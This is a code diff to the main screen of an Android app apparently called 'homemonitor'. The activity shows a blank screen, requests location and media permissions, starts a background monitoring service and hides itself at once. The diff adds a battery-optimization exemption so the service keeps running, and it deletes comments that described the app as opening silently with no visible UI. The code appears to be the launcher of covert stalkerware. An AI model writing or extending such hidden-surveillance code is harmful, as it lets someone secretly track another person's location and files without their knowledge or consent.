@@ -3,23 +3,16 @@ package com.homemonitor
 import android.Manifest
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.PowerManager
+import android.provider.Settings
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
 
-/**
- * MainActivity
- *
- * Opens silently, requests all permissions, starts MonitorService,
- * then immediately moves itself to the background.
- * No visible UI — just a blank screen for the fraction of a second
- * while the permission dialog appears.
- */
 class MainActivity : AppCompatActivity() {
-
-    // ── Permissions ──────────────────────────────────────────────────────────
 
     private val requiredPermissions: Array<String>
         get() {
@@ -31,12 +24,10 @@ class MainActivity : AppCompatActivity() {
                 Manifest.permission.ACCESS_FINE_LOCATION,
                 Manifest.permission.ACCESS_COARSE_LOCATION
             )
-            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) {
+            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2)
                 perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
-            }
-            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
+            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q)
                 perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
-            }
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 perms.add(Manifest.permission.READ_MEDIA_IMAGES)
                 perms.add(Manifest.permission.READ_MEDIA_VIDEO)
@@ -48,42 +39,41 @@ class MainActivity : AppCompatActivity() {
 
     private val permissionLauncher =
         registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
-            // Start the service regardless — commands that need denied
-            // permissions will fail gracefully inside MonitorService.
-            startMonitorAndHide()
+            requestBatteryOptimizationExemption()
         }
-
-    // ── Lifecycle ────────────────────────────────────────────────────────────
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-
-        // Completely blank white screen — no buttons, no text
         setContentView(android.widget.FrameLayout(this))
-
-        if (hasAllPermissions()) {
-            startMonitorAndHide()
-        } else {
-            permissionLauncher.launch(requiredPermissions)
-        }
+        if (hasAllPermissions()) requestBatteryOptimizationExemption()
+        else permissionLauncher.launch(requiredPermissions)
     }
 
-    // ── Helpers ──────────────────────────────────────────────────────────────
+    private fun requestBatteryOptimizationExemption() {
+        // Ask user to ignore battery optimization — one-time popup, persists forever
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val pm = getSystemService(POWER_SERVICE) as PowerManager
+            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                try {
+                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+                        data = Uri.parse("package:$packageName")
+                    }
+                    startActivity(intent)
+                } catch (_: Exception) { /* some ROMs block this intent */ }
+            }
+        }
+        startMonitorAndHide()
+    }
 
     private fun startMonitorAndHide() {
         val intent = Intent(this, MonitorService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(intent)
-        } else {
-            startService(intent)
-        }
-        // Send the app to the background so the home screen reappears
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
+        else startService(intent)
         moveTaskToBack(true)
     }
 
     private fun hasAllPermissions(): Boolean =
         requiredPermissions.all {
-            ContextCompat.checkSelfPermission(this, it) ==
-                    PackageManager.PERMISSION_GRANTED
+            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
         }
 }
